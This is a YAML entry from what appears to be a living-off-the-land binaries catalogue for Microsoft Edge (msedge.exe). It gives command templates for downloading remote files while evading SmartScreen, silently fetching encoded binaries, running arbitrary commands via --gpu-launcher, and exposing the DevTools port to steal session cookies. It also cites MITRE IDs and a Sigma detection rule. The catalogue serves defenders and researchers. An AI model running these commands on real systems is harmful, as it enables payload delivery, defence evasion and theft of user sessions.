---
Name: Msedge.exe
Description: Microsoft Edge browser
Author: mr.d0x
Created: 2022-01-20
Commands:
  - Command: msedge.exe {REMOTEURL:.exe.txt}
    Description: Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.
    Usecase: Download file from the internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10, Windows 11
  - Command: msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
    Description: Edge will silently download the file. File extension should be .html and binaries should be encoded.
    Usecase: Download file from the internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10, Windows 11
  - Command: msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
    Description: Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command
    Usecase: Executes a process under a trusted Microsoft signed binary
    Category: Execute
    Privileges: User
    MitreID: T1218.015
    OperatingSystem: Windows 10, Windows 11
    Tags:
      - Execute: CMD
  - Command: msedge.exe --headless --remote-debugging-port=9222 --user-data-dir="%LOCALAPPDATA%\Microsoft\Edge\User Data"
    Description: Edge launches in headless mode with remote debugging enabled, exposing the DevTools Protocol on port 9222. A local process can then connect to dump session cookies from the user's profile. This technique has been observed persisted via an "mseupdate" logon scheduled task in trojanized Claude installer packages that exfiltrated cookies to attacker infrastructure.
    Usecase: Steal web session cookies via DevTools Protocol
    Category: Credentials
    Privileges: User
    MitreID: T1539
    OperatingSystem: Windows 10, Windows 11
Full_Path:
  - Path: c:\Program Files\Microsoft\Edge\Application\msedge.exe
  - Path: c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml
